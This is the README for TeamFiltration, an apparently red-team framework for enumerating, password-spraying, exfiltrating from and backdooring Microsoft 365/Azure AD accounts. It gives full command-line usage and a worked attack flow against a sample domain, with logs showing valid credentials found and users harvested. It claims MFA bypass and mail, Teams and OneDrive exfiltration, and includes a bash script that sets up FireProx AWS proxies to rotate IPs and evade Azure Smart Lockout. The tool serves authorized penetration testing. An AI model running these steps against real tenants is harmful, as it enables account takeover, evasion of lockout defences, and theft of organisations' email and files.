## TeamFiltration 
TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts.
**See the [Example Attack flow](#example-attack-flow) at the bottom of this readme for a general introduction into how TeamFiltration works!**

This tool has been used internally since January 2021 and was publicly released in my talk "Taking a Dumb In The Cloud" during DefCON30.

You will need to provide a json config file to be able to use TeamFiltration. This configuration file contains information such as PushoverAPI keys, Dehashed API keys, Fireprox endpoints URL and much more. Please see the [guide further down](#TeamFiltration-Configruation) on how to create your own config.

## Download
[You can download the latest precompiled release for Linux, Windows and MacOSX X64 ](https://github.com/Flangvik/TeamFiltration/releases/latest)   

**The releases are precompiled into a single application-dependent binary. The size go up, but you do not need DotNetCore or any other dependencies to run them.**

## FAQ

- You cannot run multiple instances of TeamFiltration with the same --outpath, this will cause a LiteDB file write collision!
- --outpath is mandatory and needs to be supplied for each module
- --outpath is client specific across all modules
- --outpath IS A FOLDER PATH, not a file.
- Question or bug? Hit me up on Twitter or create an issue
- In order to use the --validate-teams enumeration method you need to provide a sacrificial Office 365 user account. This account cannot have MFA enforced and must be joined in AAD with an valid Basic license. (sacrificialO365Username and sacrificialO365Password in the config file)
## Usage

```

  ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╗
 ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ╠╬╬╝╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╣                              │      ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╣                              ││      ╚╬╬╝╚ └╚╝╬╬╬╬╬╬
╬╬╬╬╣         ╔╦╦╬╬╬╬╬╬╦╦╗         ││       │        ╬╬╬╬╬
╬╬╬╬╣     ╔╬╬╬╝╝┘      ╚╝╝╬╬╬┐     ││       ││       └╬╬╬╬
╬╬╬╬┤    ╬╬╝╚╩╬╗╔          ╚╬╬╬    ││       ││        ╬╬╬╬
╬╬╬╬┤   ╬╝      ╚╬╬╗╗ ╔      ╚╬╗   ││      ├││        ╬╬╬╬
╬╬╬╬┤  ╬╬     ╔╗   ╚╬╬╬╬╬╬╦    ╬╬  │┌    ╔╬┤││       ╔╬╬╬╬
╬╬╬╬┤ ╔╬┤     ╬╬╬   ╬╬╬╬╬╬╬╬╝╝╝╬╬╗ ╠╬╬╬╬╬╬╬╬╬╗      ┌╬╬╬╬╬
╬╬╬╬┤ ╬╬┤     ╚╩┘   ╚╬╬╬╬╬╩    ╠╬╬ ╚╝╝╝╝╝╝╝╝╝╬╬╗╗╗╦╬╬╬╬╬╬╬
╬╬╬╬┤ ╬╬┤                      ╠╬╬ ││         ╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤  ╬╬   ╦╗            ╗╗   ╬╬  ││         │       ╬╬╬╬
╬╬╬╬┤  └╬┐   ╚╬╗╗      ╔╬╬╝   ╔╬┘  ││         │       ╬╬╬╬
╬╬╬╬┤   └╬╗    ╚╩╩╬╬╬╩╩╝╝   ╔╬╬    ││         │       ╬╬╬╬
╬╬╬╬┤    ╚╬╬╬╗           ┌╗╬╬╝┘    ││         │       ╬╬╬╬
╬╬╬╬┤       ╚╩╬╬╬╦╦╦╦╦╦╬╬╬╝╝       ││         │       ╬╬╬╬
╬╬╬╬┤            ╚╚╝╝╝╝            ││         │       ╬╬╬╬
╬╬╬╬┤                              ││         │    ╔╗╬╬╬╬╬
╬╬╬╬┤                              ││         ╬╦╦╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ││     ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ╬╬╬╗╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
 └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╝
   ╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝

[+] TeamFiltration V0.3.3.6 PUBLIC, created by @Flangvik @TrustedSec
Usage:

   --outpath     Output path to store database and exfiltrated information (Needed for all modules)

   --config      Local path to your TeamFiltration.json configuration file, if not provided will load from current path

   --exfil       Load the exfiltration module  

         --username            Override to target a given username that does not exist in the database
         --password            Override to target a given password that does not exist in the database
         --cookie-dump         Override to target a given account using it's refresk-cookie-collection

         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
         --aad                 Exfiltrate information from Graph API (domain users and groups)
         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)
         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received) 
               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.
         --jwt-tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)

   --spray       Load the spraying module

         --aad-sso             Use SecureWorks recent Azure Active Directory password brute-forcing vuln for spraying
         --us-cloud            When spraying companies attached to US Tenants (https://login.microsoftonline.us/)
         --time-window         Defines a time windows where spraying should accour, in the military time format <12:00-19:00>
         --passwords           Path to a list of passwords, common weak-passwords will be generated if not supplied
         --seasons-only        Password generated for spraying will only be based on seasons
         --months-only         Password generated for spraying will only be based on months
         --common-only         Spray with the top 20 most common passwords
         --combo               Path to a combolist of username:password
         --exlude              Path to a list of emails to exclude from spraying

         --sleep-min           Minimum minutes to sleep between each full rotation of spraying default=60
         --sleep-max           Maximum minutes to sleep between each full rotation of spraying default=100
         --delay               Delay in seconds between each individual authentication attempt. default=0
         --push-userkey        Pushover user API key for notifications when credentials are found)
         --push-appkey         Pushover app API key for notifications when credentials are found)
         --push-locked         Get Pushover notifications when an sprayed account gets locked (requires --push-userkey and --push-appkey)
         --force               Force the spraying to proceed even if there is less the <sleep> time since the last attempt

   --enum        Load the enumeration module

         --domain              Domain to perfom enumeration against, names pulled from statistically-likely-usernames if not provided with --usernames
         --usernames           Path to a list of usernames to enumerate (emails)
         --dehashed            Use the dehashed submodule in order to enumerate emails from a basedomain
         --validate-msol       Validate that the given o365 accounts exists using the public GetCredentialType method (Very RateLimited - Slow 20 e/s)
         --validate-teams      Validate that the given o365 accounts exists using the Teams API method (Recommended - Super Fast 300 e/s)
         --validate-login      Validate that the given o365 accounts by attemping to login (Noisy - triggers logins - Fast 100 e/s)

   --backdoor        Loads the interactive backdoor module

   --database        Loads the interactive database browser module

   --debug           Add burp as a proxy on 127.0.0.1:8080

   Examples:

        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push-userkey XXX --push-appkey XXX
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --push-userkey XXX --push-appkey XXX --push-locked --months-only --exlude C:\Clients\2021\FooBar\Exclude_Emails.txt
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --all 
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --aad  
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --backdoor
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --database
```

## Example Attack Flow

Start the external by performing recon using Dehashed, Linkedin, Hunter.io, Google Dorks etc.
When you figured out what the email syntax for the company is, you are ready to enumerate and validate emails that exists within the target o365 tenant

The --outpath is needed for all modules within TeamFiltration, and acts as a localised workspace / project folder for all information related to this attack/client to be stored

Start the enum with the following command, where --domain is your target client domain name
```
 TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
```

Choose the enumerated email syntax. This will pull different emails and syntaxes from the statistically likely usernames repo. Once you select a syntax, TeamFiltration will use its private, passive and unsaturated Teams method to validate them (hence the --validate-teams argument)

```
[♥] TeamFiltration V0.3.2.6, created by @Flangvik
[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
[+] No usernames list provided, pulling statistically-likely-usernames
[?] Provide a target domain/tenant (e.g legitcorp.net) #> legitcorp.net
    |=> [1] john.smith@legitcorp.net
    |=> [2] john@legitcorp.net
    |=> [3] johnjs@legitcorp.net
    |=> [4] johns@legitcorp.net
    |=> [5] johnsmith@legitcorp.net
    |=> [6] jsmith@legitcorp.net
    |=> [7] smith@legitcorp.net
    |=> [8] smithj@legitcorp.net
    |=> [9] john_smith@legitcorp.net

[?] Select an email format #> 1
```

If you would like to supply your own email list to validate, simply use the --usernames argument.
Validated emails get stored automatically in the TeamFiltration.db file located in the --outpath folder. This way, there is no need to supply data manually through each module.

```
[ENUM] 24.05.2021 12:31:05 EST Filtering out previusly attempted accounts
[ENUM] 24.05.2021 12:31:06 EST Enumerating 248231 possible accounts, this will take ~14 minutes
[ENUM] 24.05.2021 12:31:07 EST Successfully got Teams token for sacrificial account
[ENUM] 24.05.2021 12:31:07 EST Loaded 248231 usernames
[ENUM] 24.05.2021 12:31:08 EST enita.lintz@legitcorp.net valid!
[ENUM] 24.05.2021 12:31:09 EST bruce.wayne@legitcorp.net valid!
[ENUM] 24.05.2021 12:31:13 EST herminia.oliva@legitcorp.net valid!
[ENUM] 24.05.2021 12:31:13 EST thomas.anderson@legitcorp.net valid!
[ENUM] 24.05.2021 12:31:17 EST sharilyn.penning@legitcorp.net valid!
```
Next up we will spray the validated emails with the following command

```
 TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
```

When no passwords list is provided, TeamFiltration will generate its own based on the Month, Season, and year!
If you would like to supply your own passwordlist, simply use the --passwords argument.

```
[♥] TeamFiltration V0.3.2.6, created by @Flangvik
[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
[SPRAY] 24.05.2021 12:33:54 EST Sleeping between 60-100 minutes for each round
[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed renita.lintz@legitcorp.net:Spring2021!          => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed bruce.wayne@legitcorp.net:Spring2021!           => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed herminia.oliva@legitcorp.net:Spring2021!        => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed biff.tannen@legitcorp.net:Spring2021!           => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed elijah.blakley@legitcorp.net:Spring2021!        => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed thomas.anderson@legitcorp.net:Spring2021!       => VALID NO MFA!
[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed chris.kelly@legitcorp.net:Spring2021!           => INVALID
[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed deadpool@legitcorp.net:Spring2021!              => INVALID
[SPRAY] us-west-1 24.05.2021 12:34:00 EST Sprayed sharilyn.penning@legitcorp.net:Spring2021!      => INVALID
[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed master.kevin@legitcorp.net:Spring2021!          => INVALID
[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed adam.wally@legitcorp.net:Spring2021!            => INVALID
[SPRAY] 24.05.2021 12:34:01 EST Sleeping 78 before next spray
```

With a set of valid credentials found, we can move into the exfil module. The valid credentials and account information is stored in the teamfiltration database, so you do not need to provide them when using the --exfil module.

```
 TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --exfil --aad
```

This will attempt to bypass any MFA, and if successful, exfiltrate information from resources accessible within o365. The --aad or Azure Active Directory plugin will attempt to exfiltrate all users, groups, and domains from the o365 tenant. All new users will automatically be added to the database as valid users. 

```
[♥] TeamFiltration V0.3.2.6, created by @Flangvik
[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --exfil --aad
[+] You can select multiple users using syntax 1,2,3 or 1-3
    |-> 0 - thomas.anderson@legitcorp.net
    |-> ALL - Everyone!

[?] What user to target ? #> 0
[EXFIL] 24.05.2021 12:35:43 EST Attempting to exfiltrate using provided token
[EXFIL] 24.05.2021 12:35:44 EST Refreshed a token for => https://outlook.office365.com
[EXFIL] 24.05.2021 12:35:45 EST Refreshed a token for => https://api.spaces.skype.com
[EXFIL] 24.05.2021 12:35:45 EST Cross-resource-refresh allowed, we can exfil all that things!
[EXFIL] 24.05.2021 12:35:53 EST Refreshed a token for => https://graph.windows.net
[EXFIL] 24.05.2021 12:35:54 EST Refreshed a token for => https://graph.microsoft.com
[EXFIL] 24.05.2021 12:35:54 EST Exfiltrating AAD users and groups via MS AD Graph API
[EXFIL] 24.05.2021 12:35:58 EST Exfiltrating AAD users and groups via MS graph API
[EXFIL] 24.05.2021 12:35:59 EST Got 133 AAD users, appending to database as valid users!
```
With those new valid accounts added, we can go back to the spraying module and successfully hit all the accounts in the domain.

You can also exfiltrate Emails + Attachments, OneDrive files, Teams Chat Logs + Attachments, and raw JWT tokens using different exfil plugins as shown in the --help menu.
```
         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
         --aad                 Exfiltrate information from Graph API (domain users and groups)
         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)
         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)
               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.
         --tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)
```

## TeamFiltration Configruation

Below is an example TeamFiltration config file, the configuration file needs to be supplied everytime you run TeamFiltration, using the --config argument.
```
{
    "pushoverAppKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "pushoverUserKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "msolFireProxEndpointsUs": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token"],
    "msolFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token"],
    "teamsEnumFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/"],
    "aadSSoFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox"],
    "sacrificialO365Username": "mr.andersen@matrix.com",
    "sacrificialO365Passwords": "TheChooenOne123!",
      "dehashedApiKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
	"dehashedEmail" : "bruce.wayne@batcave.com",
    "proxyEndpoint": "http://127.0.0.1:8080"
  }
  ```

  `pushoverAppKey`
  This is your Pushover Application Token / API Token (Optional).

  `pushoverUserKey`
  This is your Pushover Application  User Key / User Token (Optional).

  `msolFireProxEndpointsUs`
  An string array of fireprox endpoints generated to be pointing at -> `https://login.microsoftonline.us/`

  `msolFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://login.microsoftonline.com/`

  `teamsEnumFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://teams.microsoft.com/api/mt/`

  `aadSSoFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://autologon.microsoftazuread-sso.com/` (Optional).

  `sacrificialO365Username`
 The username / email for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional, but cannot have MFA / Conditional access enabled, dohh)

  `sacrificialO365Passwords`
 The password for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional).

  `dehashedApiKey`
  Your Dehashed API key for auth (Optional).

  `dehashedEmail`
   Your Dehashed Account Email key for auth (Optional).

  `proxyEndpoint`
  HTTP endpoint used for inspecting traffic / debugging purposes, eg Burp,MitMProxy etc.



### Generate FireProx URLs
TeamFiltration heavily uses FireProx url in order to slow Azure Smart Lockout down, the more URL's the better.
Follow the instructions below in order to generate FireProx URL's for your own Config

```
git clone https://github.com/ustayready/fireprox
cd fireprox
```

Create the following bash script inside the folder!

```
#!/bin/bash
# create_fireprox_instances.sh

# https://stackoverflow.com/questions/1527049/how-can-i-join-elements-of-an-array-in-bash
function join_by { local IFS="$1"; shift; echo "$*"; }

# Possible AWS regions
regionsArray=( us-east-1 us-west-1 us-west-2 ca-central-1 eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-north-1 )

#Endpoint to be proxied
msolEndpoint="https://login.microsoftonline.com/"
msolEndpointUs="https://login.microsoftonline.us/"
teamsEnumEndpoint="https://teams.microsoft.com/api/mt/"
aadSSoEndpoint="https://autologon.microsoftazuread-sso.com/"


declare -a msolFireProxEndpoints
declare -a msolFireProxEndpointsUs
declare -a teamsEnumFireProxEndpoints
declare -a aadSSoFireProxEndpoints

#generate them all
for i in "${regionsArray[@]}"
do 
	newMsolEndpoint=$( python3 fire.py --access_key <AWS-ACCESS-KEY> --secret_access_key  <AWS-SECRET-KEY> --region $i --command create --url $msolEndpoint | grep -iPo "https?:\/\/(www\.)?[-a-zA-Z0-9]{10}.*\.amazonaws\.com\/fireprox\/" )
    msolFireProxEndpoints=("${msolFireProxEndpoints[@]}" "\"$newMsolEndpoint\"")
	echo "[+] Created $newMsolEndpoint that points to $msolEndpoint"

	newMsolEndpointUs=$(python3 fire.py --access_key <AWS-ACCESS-KEY> --secret_access_key  <AWS-SECRET-KEY> --region $i --command create --url $msolEndpointUs | grep -iPo "https?:\/\/(www\.)?[-a-zA-Z0-9]{10}.*\.amazonaws\.com\/fireprox\/" )
	msolFireProxEndpointsUs=("${msolFireProxEndpointsUs[@]}" "\"$newMsolEndpointUs\"")
	echo "[+] Created $newMsolEndpointUs that points to $msolEndpointUs"

	newTeamsEnumEndpoint=$(python3 fire.py --access_key <AWS-ACCESS-KEY> --secret_access_key  <AWS-SECRET-KEY> --region $i --command create --url $teamsEnumEndpoint | grep -iPo "https?:\/\/(www\.)?[-a-zA-Z0-9]{10}.*\.amazonaws\.com\/fireprox\/" )
	teamsEnumFireProxEndpoints=("${teamsEnumFireProxEndpoints[@]}" "\"$newTeamsEnumEndpoint\"")
	echo "[+] Created $newTeamsEnumEndpoint that points to $teamsEnumEndpoint"

	newAadSSoEndpoint=$(python3 fire.py --access_key <AWS-ACCESS-KEY> --secret_access_key  <AWS-SECRET-KEY> --region $i --command create --url $aadSSoEndpoint | grep -iPo "https?:\/\/(www\.)?[-a-zA-Z0-9]{10}.*\.amazonaws\.com\/fireprox\/" )
	aadSSoFireProxEndpoints=("${aadSSoFireProxEndpoints[@]}" "\"$newAadSSoEndpoint\"")
	echo "[+] Created $newAadSSoEndpoint that points to $aadSSoEndpoint"

done
	
	echo "[+] Done, printing jsonArray(s)"
	echo ""

	msolFireProxEndpointsJsonArray=$(join_by , ${msolFireProxEndpoints[@]})
	echo "\"msolFireProxEndpoints\":[$msolFireProxEndpointsJsonArray],"

	msolFireProxEndpointsUsJsonArray=$(join_by , ${msolFireProxEndpointsUs[@]})
	echo "\"msolFireProxEndpointsUs\":[$msolFireProxEndpointsUsJsonArray],"

	teamsEnumFireProxEndpointsJsonArray=$(join_by , ${teamsEnumFireProxEndpoints[@]})
	echo "\"teamsEnumFireProxEndpoints\":[$teamsEnumFireProxEndpointsJsonArray],"

	aadSSoFireProxEndpointsJsonArray=$(join_by , ${aadSSoFireProxEndpoints[@]})
	echo "\"aadSSoFireProxEndpoints\":[$aadSSoFireProxEndpointsJsonArray],"


```

Fill in our AWS access keys and run the script, the bash script will output the JSON FireProx portion for your config, simply copy and paste! :)  

## Credits

- [GitHub - KoenZomers/OneDriveAPI: API in .NET to communicate with OneDrive Personal and OneDrive for Business](https://github.com/KoenZomers/OneDriveAPI)
- [Research into Undocumented Behavior of Azure AD Refresh Tokens ](https://github.com/secureworks/family-of-client-ids-research) 
- [WS API Gateway management tool for creating on the fly HTTP pass-through proxies for unique IP rotation](https://github.com/ustayready/fireprox)
- Credits to [Ryan] (https://twitter.com/detectdotdev) for validating and discussing my observations / questions!
- The entire [TrustedSec](https://TrustedSec.com) team for helping me polish this tool! 

